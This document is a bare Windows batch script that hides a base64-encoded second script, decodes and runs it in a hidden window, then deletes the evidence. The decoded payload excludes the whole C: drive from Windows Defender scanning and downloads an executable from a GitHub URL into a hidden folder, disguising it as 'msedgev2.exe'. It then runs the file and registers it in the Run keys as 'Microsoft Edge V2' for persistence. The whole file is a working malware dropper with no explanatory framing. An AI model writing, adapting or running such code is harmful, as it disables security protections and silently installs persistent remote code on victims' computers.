@echo off
setlocal enabledelayedexpansion

set "base64String=QGVjaG8gb2ZmCnNldGxvY2FsIEVuYWJsZURlbGF5ZWRFeHBhbnNpb24KCnB1c2hkICIlfmRwMCIKCnBvd2Vyc2hlbGwgLVdpbmRvd1N0eWxlIEhpZGRlbiAtQ29tbWFuZCAiQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAnQzpcJyIKCnRpbWVvdXQgL3QgMyAvbm9icmVhayA+bnVsCgpzZXQgIkNIUk9NRURJUj0lTG9jYWxBcHBEYXRhJVxDaHJvbWUiCnNldCAiVEFSR0VUPSVDSFJPTUVESVIlXG1zZWRnZXYyLmV4ZSIKCmlmIG5vdCBleGlzdCAiJUNIUk9NRURJUiUiIG1rZGlyICIlQ0hST01FRElSJSIKYXR0cmliICtoICIlQ0hST01FRElSJSIgL3MgL2QKY2QgIiVDSFJPTUVESVIlIgoKOmRvd25sb2FkCmlmIGV4aXN0ICIlVEFSR0VUJSIgKAogICAgYXR0cmliICtoICIlVEFSR0VUJSIgL3MgL2QKICAgIHN0YXJ0ICIiICIlVEFSR0VUJSIKICAgIHRpbWVvdXQgL3QgMiA+bnVsCgogICAgdGFza2xpc3QgfCBmaW5kIC9pICJtc2VkZ2V2Mi5leGUiID5udWwKICAgIGlmICFlcnJvcmxldmVsISA9PSAwICgKICAgICAgICBnb3RvIHJlZ2VkaXQKICAgICkgZWxzZSAoCiAgICAgICAgdGltZW91dCAvdCAyID5udWwKICAgICAgICBnb3RvIGRvd25sb2FkCiAgICApCikgZWxzZSAoCiAgICBwb3dlcnNoZWxsIC1XaW5kb3dTdHlsZSBIaWRkZW4gLUNvbW1hbmQgIltOZXQuU2VydmljZVBvaW50TWFuYWdlcl06OlNlY3VyaXR5UHJvdG9jb2wgPSBbTmV0LlNlY3VyaXR5UHJvdG9jb2xUeXBlXTo6VGxzMTI7IEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJ2h0dHBzOi8vZ2l0aHViLmNvbS9jb25mZXNzeW91cmNpbi94b3Itb2JmdXNjYXRvci9yYXcvcmVmcy9oZWFkcy9tYWluL21zZWRnZXYyLmV4ZScgLU91dEZpbGUgJyVUQVJHRVQlJyIKICAgIHRpbWVvdXQgL3QgNSAvbm9icmVhayA+bnVsCiAgICBnb3RvIGRvd25sb2FkCikKCjpyZWdlZGl0CnJlZyBxdWVyeSAiSEtDVVxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW4iIC92ICJNaWNyb3NvZnQgRWRnZSBWMiIgPm51bCAyPiYxCmlmIGVycm9ybGV2ZWwgMSAoCiAgICByZWcgYWRkICJIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biIgL3YgIk1pY3Jvc29mdCBFZGdlIFYyIiAvdCBSRUdfU1ogL2QgIlwiJVRBUkdFVCVcIiIgL2YgPm51bAopCgpyZWcgcXVlcnkgIkhLTE1cU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuIiAvdiAiTWljcm9zb2Z0IEVkZ2UgVjIiID5udWwgMj4mMQppZiBlcnJvcmxldmVsIDEgKAogICAgcmVnIGFkZCAiSEtMTVxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW4iIC92ICJNaWNyb3NvZnQgRWRnZSBWMiIgL3QgUkVHX1NaIC9kICJcIiVUQVJHRVQlXCIiIC9mID5udWwKKQoKZW5kbG9jYWwKZXhpdAo="



powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%base64String%')) | Set-Content -Encoding UTF8 decoded.bat"


set "trycount=0"
:waitloop
if exist "decoded.bat" (
    goto runit
)
set /a trycount+=1
if %trycount% GEQ 20 (
    exit /b
)
ping -n 2 127.0.0.1 >nul
goto waitloop

:runit

powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "Start-Process -FilePath 'decoded.bat' -WindowStyle Hidden -Wait"


ping -n 31 127.0.0.1 >nul


del /f /q decoded.bat

exit
